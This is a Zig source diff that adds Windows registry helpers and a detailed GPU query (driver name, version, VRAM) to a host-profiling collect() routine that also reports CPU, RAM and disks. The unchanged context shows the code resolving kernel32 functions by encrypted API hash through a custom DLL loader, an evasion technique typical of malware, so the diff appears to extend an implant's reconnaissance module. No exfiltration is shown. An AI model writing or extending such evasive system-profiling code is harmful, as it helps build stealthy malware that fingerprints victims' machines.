@@ -79,6 +79,44 @@ fn readRegWideString(allocator: std.mem.Allocator, key: types.HANDLE, comptime v
     return try out.toOwnedSlice();
 }
 
+fn readRegDword(key: types.HANDLE, comptime value_name: []const u8) ?u32 {
+    var buf_us: [512]u16 = undefined;
+    var buf_data: [64]u8 = undefined;
+    var vn = initUnicodeString(value_name, &buf_us);
+    var result_len: types.ULONG = 0;
+    const status = engine.NtQueryValueKey(
+        key,
+        &vn,
+        @intFromEnum(types.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation),
+        @as(types.PVOID, @ptrCast(&buf_data)),
+        @as(types.ULONG, @intCast(buf_data.len)),
+        &result_len,
+    );
+    if (status < 0) return null;
+    const kvpi: *types.KEY_VALUE_PARTIAL_INFORMATION = @ptrCast(@alignCast(&buf_data));
+    if (kvpi.Type != 4 or kvpi.DataLength < 4) return null;
+    return std.mem.readInt(u32, buf_data[@offsetOf(types.KEY_VALUE_PARTIAL_INFORMATION, "Data")..][0..4], .little);
+}
+
+fn readRegQword(key: types.HANDLE, comptime value_name: []const u8) ?u64 {
+    var buf_us: [512]u16 = undefined;
+    var buf_data: [64]u8 = undefined;
+    var vn = initUnicodeString(value_name, &buf_us);
+    var result_len: types.ULONG = 0;
+    const status = engine.NtQueryValueKey(
+        key,
+        &vn,
+        @intFromEnum(types.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation),
+        @as(types.PVOID, @ptrCast(&buf_data)),
+        @as(types.ULONG, @intCast(buf_data.len)),
+        &result_len,
+    );
+    if (status < 0) return null;
+    const kvpi: *types.KEY_VALUE_PARTIAL_INFORMATION = @ptrCast(@alignCast(&buf_data));
+    if (kvpi.Type != 11 or kvpi.DataLength < 8) return null;
+    return std.mem.readInt(u64, buf_data[@offsetOf(types.KEY_VALUE_PARTIAL_INFORMATION, "Data")..][0..8], .little);
+}
+
 fn getCpuCores() ?u8 {
     var info: types.SYSTEM_BASIC_INFORMATION = undefined;
     var ret_len: types.ULONG = 0;
@@ -142,6 +180,51 @@ fn getGpuName(allocator: std.mem.Allocator) ![]const u8 {
     return allocator.dupe(u8, "Unknown");
 }
 
+fn getGpuDetailed(allocator: std.mem.Allocator) ![]const u8 {
+    const base_path = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}";
+    const indices = [_][]const u8{ "0000", "0001", "0002" };
+    for (indices) |idx| {
+        var path_buf: [256]u8 = undefined;
+        const full_path = try std.fmt.bufPrint(&path_buf, "{s}\\{s}", .{ base_path, idx });
+        var path_us: [512]u16 = undefined;
+        @memset(&path_us, 0);
+        for (full_path, 0..) |c, k| path_us[k] = c;
+        var us = types.UNICODE_STRING{
+            .Length = @as(types.USHORT, @intCast(full_path.len * 2)),
+            .MaximumLength = @as(types.USHORT, @intCast(path_us.len * 2)),
+            .Buffer = @as(types.PWSTR, @ptrCast(&path_us)),
+        };
+        var oa = types.OBJECT_ATTRIBUTES{
+            .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
+            .RootDirectory = null,
+            .ObjectName = &us,
+            .Attributes = types.OBJ_CASE_INSENSITIVE,
+            .SecurityDescriptor = null,
+            .SecurityQualityOfService = null,
+        };
+        var sub_key: types.HANDLE = undefined;
+        const st = engine.NtOpenKey(&sub_key, types.KEY_QUERY_VALUE, @as(types.PVOID, @ptrCast(&oa)));
+        if (st < 0) continue;
+        defer _ = engine.NtClose(sub_key);
+
+        const name = readRegWideString(allocator, sub_key, "DriverDesc") catch continue;
+        const ver = readRegWideString(allocator, sub_key, "DriverVersion") catch allocator.dupe(u8, "N/A") catch continue;
+
+        const vram_bytes = readRegQword(sub_key, "HardwareInformation.qwMemorySize") orelse
+            @as(u64, readRegDword(sub_key, "HardwareInformation.qwMemorySize") orelse 0);
+
+        var result = std.ArrayList(u8).init(allocator);
+        try result.writer().print("{s} | Driver: {s}", .{ name, ver });
+        if (vram_bytes > 0) {
+            try result.writer().print(" | VRAM: {} MB", .{vram_bytes / (1024 * 1024)});
+        }
+        allocator.free(name);
+        allocator.free(ver);
+        return try result.toOwnedSlice();
+    }
+    return allocator.dupe(u8, "Unknown");
+}
+
 fn getDiskInfo(allocator: std.mem.Allocator) ![]const u8 {
     const kernel32 = dll_loader.getOrLoadDll("kernel32.dll") orelse return allocator.dupe(u8, "Disks: Unavailable");
     const get_drives_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetLogicalDrives")) orelse return allocator.dupe(u8, "Disks: Unavailable");
@@ -197,7 +280,7 @@ pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
         try parts.appendSlice("\nRAM: Unknown");
     }
 
-    const gpu = try getGpuName(allocator);
+    const gpu = try getGpuDetailed(allocator);
     defer allocator.free(gpu);
     try parts.appendSlice(try std.fmt.allocPrint(parts.allocator, "\nGPU: {s}", .{gpu}));
 
